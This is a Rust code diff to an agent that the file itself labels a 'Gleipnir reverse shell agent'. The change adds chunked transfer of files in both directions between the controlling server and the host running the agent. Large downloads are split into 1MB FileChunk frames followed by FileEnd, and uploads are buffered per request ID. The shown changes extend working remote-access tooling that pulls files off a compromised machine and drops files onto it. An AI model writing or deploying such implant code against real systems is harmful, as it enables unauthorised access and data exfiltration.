@@ -9,6 +9,7 @@ mod transfer;
 use bytes::BytesMut;
 use clap::Parser;
 use futures_util::{SinkExt, StreamExt};
+use std::collections::HashMap;
 use tokio::sync::mpsc;
 use tokio_util::codec::Framed;
 use tracing::{debug, info, warn};
@@ -17,6 +18,8 @@ use connect::ConnectConfig;
 use executor::Executor;
 use protocol::{Frame, FrameType};
 use socks::SocksAgent;
+
+const CHUNK_SIZE: usize = 1024 * 1024; // 1MB
 
 #[derive(Parser)]
 #[command(name = "gleipnir-agent", about = "Gleipnir reverse shell agent")]
@@ -150,6 +153,11 @@ async fn session_loop(
     // Channel for outbound frames (SOCKS data flows back through here)
     let (outbound_tx, mut outbound_rx) = mpsc::channel::<Frame>(256);
 
+    // Accumulator for chunked file uploads from server
+    let mut chunked_uploads: HashMap<u32, Vec<u8>> = HashMap::new();
+    // Track the remote_path for chunked uploads (extracted from the first FileUp frame)
+    let mut chunked_paths: HashMap<u32, String> = HashMap::new();
+
     // Send platform info with session_id for resume
     let info = platform::PlatformInfo::detect().with_session_id(Some(session_id));
     info!(
@@ -223,13 +231,44 @@ async fn session_loop(
                     }
 
                     FrameType::FileUp => {
-                        let resp = match transfer::handle_file_up(&frame.payload).await {
-                            Ok(msg) => Frame::cmd_output(frame.request_id, msg.as_bytes()),
-                            Err(e) => Frame::error(frame.request_id, &e),
-                        };
-                        if let Err(e) = framed.send(resp).await {
-                            warn!("failed to send file upload response: {e}");
-                            break;
+                        // Parse path from payload header, then handle data
+                        let payload = &frame.payload;
+                        if payload.len() < 4 {
+                            let _ = framed.send(Frame::error(frame.request_id, "invalid file upload")).await;
+                            continue;
+                        }
+                        let path_len = u32::from_be_bytes([payload[0], payload[1], payload[2], payload[3]]) as usize;
+                        if payload.len() < 4 + path_len {
+                            let _ = framed.send(Frame::error(frame.request_id, "invalid file upload path")).await;
+                            continue;
+                        }
+                        let path = String::from_utf8_lossy(&payload[4..4 + path_len]).to_string();
+                        let data = &payload[4 + path_len..];
+
+                        // Check if this is a single-frame upload or start of chunked
+                        // We store the data; if FileChunk/FileEnd follow they'll append.
+                        // If no chunks follow, we just got a complete small file.
+                        chunked_uploads.insert(frame.request_id, data.to_vec());
+                        chunked_paths.insert(frame.request_id, path.clone());
+                    }
+
+                    FrameType::FileChunk => {
+                        if let Some(buf) = chunked_uploads.get_mut(&frame.request_id) {
+                            buf.extend_from_slice(&frame.payload);
+                        }
+                    }
+
+                    FrameType::FileEnd => {
+                        let rid = frame.request_id;
+                        if let (Some(data), Some(path)) = (chunked_uploads.remove(&rid), chunked_paths.remove(&rid)) {
+                            let resp = match transfer::handle_file_up_data(&path, &data).await {
+                                Ok(msg) => Frame::cmd_output(rid, msg.as_bytes()),
+                                Err(e) => Frame::error(rid, &e),
+                            };
+                            if let Err(e) = framed.send(resp).await {
+                                warn!("failed to send file upload response: {e}");
+                                break;
+                            }
                         }
                     }
 
@@ -241,17 +280,42 @@ async fn session_loop(
                                 continue;
                             }
                         };
-                        let resp = match transfer::handle_file_down(&path).await {
-                            Ok(data) => Frame::new(
-                                FrameType::FileDown,
-                                frame.request_id,
-                                BytesMut::from(&data[..]),
-                            ),
-                            Err(e) => Frame::error(frame.request_id, &e),
-                        };
-                        if let Err(e) = framed.send(resp).await {
-                            warn!("failed to send file download response: {e}");
-                            break;
+                        let rid = frame.request_id;
+                        match transfer::handle_file_down(&path).await {
+                            Ok(data) => {
+                                // Send all data as FileDown (small) or FileChunk* + FileEnd (large)
+                                if data.len() <= CHUNK_SIZE {
+                                    let resp = Frame::new(FrameType::FileDown, rid, BytesMut::from(&data[..]));
+                                    if let Err(e) = framed.send(resp).await {
+                                        warn!("failed to send file download response: {e}");
+                                        break;
+                                    }
+                                } else {
+                                    let mut offset = 0;
+                                    let mut send_failed = false;
+                                    while offset < data.len() {
+                                        let end = (offset + CHUNK_SIZE).min(data.len());
+                                        let chunk = &data[offset..end];
+                                        let f = Frame::new(FrameType::FileChunk, rid, BytesMut::from(chunk));
+                                        if let Err(e) = framed.send(f).await {
+                                            warn!("failed to send file chunk: {e}");
+                                            send_failed = true;
+                                            break;
+                                        }
+                                        offset = end;
+                                    }
+                                    if send_failed { break; }
+
+                                    let f = Frame::new(FrameType::FileEnd, rid, BytesMut::new());
+                                    if let Err(e) = framed.send(f).await {
+                                        warn!("failed to send file end: {e}");
+                                        break;
+                                    }
+                                }
+                            }
+                            Err(e) => {
+                                let _ = framed.send(Frame::error(rid, &e)).await;
+                            }
                         }
                     }
 
